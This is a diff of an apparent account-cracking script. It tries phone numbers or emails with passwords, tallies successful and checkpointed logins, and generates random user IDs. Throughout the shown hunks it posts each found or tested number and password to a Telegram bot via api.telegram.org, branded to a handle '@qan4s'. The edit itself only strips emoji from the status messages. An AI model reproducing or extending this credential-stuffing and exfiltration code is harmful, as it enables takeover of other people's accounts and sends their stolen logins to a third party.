@@ -147,7 +147,7 @@ def main():
             r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. Number  : {Email}\n\n.✥. Pass  : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
         else:
             Sk += 1
-            r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
+            r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER  : [ → {Email} ← ]\n\n.✥. PASS  : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
             os.system("clear")
             
             print(logo2)
@@ -188,7 +188,7 @@ def main():
                 r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. Number  : {Email}\n\n.✥. Pass  : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
             else:
                 Sk += 1
-                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
+                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER  : [ → {Email} ← ]\n\n.✥. PASS  : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
                 os.system("clear")
                 
                 print(logo2)
@@ -229,7 +229,7 @@ def main():
                 r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. Number  : {Email}\n\n.✥. Pass  : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
             else:
                 Sk += 1
-                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
+                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER  : [ → {Email} ← ]\n\n.✥. PASS  : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
                 os.system("clear")
                 
                 user = str(''.join((random.choice(new) for i in range(7))))
